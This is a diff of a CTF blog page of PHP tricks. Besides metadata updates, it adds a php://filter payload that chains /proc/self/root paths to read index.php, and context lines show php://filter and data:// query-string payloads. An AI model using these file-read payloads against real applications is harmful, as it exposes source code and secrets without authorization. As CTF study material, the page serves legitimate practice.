@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
 <meta property="article:published_time" content="2023-05-08T13:37:40.000Z">
-<meta property="article:modified_time" content="2023-05-22T09:58:48.525Z">
+<meta property="article:modified_time" content="2023-05-23T12:26:13.226Z">
 <meta property="article:author" content="cat">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="ctf">
@@ -236,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.7k 字
+          6.1k 字
         
       </span>
     
@@ -247,7 +247,7 @@
         
         
         
-          24 分钟
+          26 分钟
         
       </span>
     
@@ -378,7 +378,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：3 小时前
+                    本文最后更新于：1 小时前
                   
                 
               </p>
@@ -392,6 +392,8 @@
 <span id="more"></span>
 <h2 id="读文件">读文件</h2>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=hint.php<br></code></pre></td></tr></table></figure>
+<h2 id="Proc-目录在-CTF-中的利用">Proc 目录在 CTF 中的利用</h2>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/cwd/i</span>ndex.php<br></code></pre></td></tr></table></figure>
 <h2 id="file-get-contents">file_get_contents</h2>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=data:<span class="hljs-regexp">//</span>text/plain,I want flag<br></code></pre></td></tr></table></figure>
 <h2 id="取反绕过">取反绕过</h2>
